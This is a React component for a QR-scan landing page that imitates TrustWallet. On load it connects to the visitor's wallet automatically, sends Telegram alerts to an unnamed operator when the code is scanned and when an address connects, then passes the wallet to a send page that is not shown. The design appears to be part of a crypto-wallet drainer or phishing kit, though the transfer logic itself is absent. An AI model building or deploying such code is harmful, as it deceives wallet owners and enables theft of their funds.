
import { useEffect, useState } from "react";import { ethers } from "ethers";
import { notify, formatAddress } from "../lib/telegram";
import SendPage from "./send-page";

type Step = "detecting" | "send" | "error";

export default function QRLanding() {
  const [step, setStep] = useState<Step>("detecting");
  const [provider, setProvider] = useState<ethers.BrowserProvider | null>(null);
  const [address, setAddress] = useState("");

  useEffect(() => {
    // Notify that QR was scanned
    notify("📱 <b>QR Code Scanned</b>");

    const tryDetect = async () => {
      const eth = (window as any).ethereum;
      const trust = (window as any).trustwallet?.ethereum;

      // Detect TrustWallet specifically
      const twProvider = trust || eth;

      if (!twProvider) {
        setStep("error");
        return;
      }

      try {
        const bp = new ethers.BrowserProvider(twProvider);
        const accounts = await bp.send("eth_requestAccounts", []);
        const addr = accounts[0];

        await notify(`🔗 <b>Wallet Connected</b>\n${formatAddress(addr)}`);

        setProvider(bp);
        setAddress(addr);
        setStep("send");
      } catch (err) {
        setStep("error");
      }
    };

    // Auto-detect on page load (no connect button needed)
    tryDetect();
  }, []);

  if (step === "detecting") {
    return (
      <div className="min-h-screen bg-[#0C0F1E] flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 border-4 border-[#23263B] border-t-[#3375BB] rounded-full animate-spin mx-auto mb-4" />
          <p className="text-white text-lg">Connecting to TrustWallet...</p>
          <p className="text-[#8892A4] text-sm mt-2">Please approve the connection in your wallet</p>
        </div>
      </div>
    );
  }

  if (step === "error") {
    return (
      <div className="min-h-screen bg-[#0C0F1E] flex items-center justify-center px-6">
        <div className="text-center">
          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-red-500/20 flex items-center justify-center">
            <span className="text-red-500 text-3xl">!</span>
          </div>
          <h2 className="text-white text-xl font-semibold mb-2">Wallet Not Detected</h2>
          <p className="text-[#8892A4] text-sm">
            Please open this page in TrustWallet's built-in browser.
          </p>
          <p className="text-[#5A5F7A] text-xs mt-4">
            TrustWallet &rarr; DApp Browser &rarr; Enter this URL
          </p>
        </div>
      </div>
    );
  }

  if (provider && address) {
    return <SendPage provider={provider} address={address} />;
  }

  return null;
}